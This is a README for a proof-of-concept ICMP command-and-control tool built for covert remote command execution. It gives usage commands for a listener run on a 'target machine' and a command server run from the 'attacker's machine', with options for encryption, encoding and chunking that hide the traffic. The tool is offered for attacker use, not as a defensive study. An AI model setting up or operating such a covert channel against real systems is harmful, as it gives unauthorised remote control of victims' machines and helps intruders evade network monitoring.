```markdown
# ICMP C2 Command and Control System

This repository contains a proof-of-concept (PoC) ICMP-based Command and Control (C2) system for covert communication and remote command execution. The system consists of two main components: the ICMP C2 Command Server and the ICMP C2 Listener. Note that the attacker must know the IP address of the remote machine to establish communication.

## Features

- ICMP-based Communication
- Data Encoding (base64, hex)
- Data Compression
- Symmetric Encryption
- Chunked Data Transmission
- Cross-Platform

## Requirements

- Python 3.6+
- Scapy: `pip install scapy`
- Cryptography: `pip install cryptography`

## Usage

### ICMP C2 Listener

Start the listener on the target machine with various options:

```sh
# Basic usage
python3 icmp_listener.py -i eth0

# With encryption and specific ICMP ID
python3 icmp_listener.py -i eth0 --icmp-id 13170 --encrypt --key your_encryption_key

# With compression and hex encoding
python3 icmp_listener.py -i eth0 --compress --encoding hex
```

### ICMP C2 Command Server

Start the command server on the attacker's machine, replacing `192.168.1.100` with the actual IP address of the target machine:

```sh
# Basic usage
python3 icmp_command_server.py -i eth0 -d 192.168.1.100

# With encryption and specific TTL
python3 icmp_command_server.py -i eth0 -d 192.168.1.100 --ttl 128 --encrypt --key your_encryption_key

# With base64 encoding and chunk size
python3 icmp_command_server.py -i eth0 -d 192.168.1.100 --encoding base64 --chunk-size 300
```

## Example Commands

- `exit`: Exit the C2 Command.
- `help`: Show this help message.
- `<any command>`: Execute the specified command on the target.





## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```
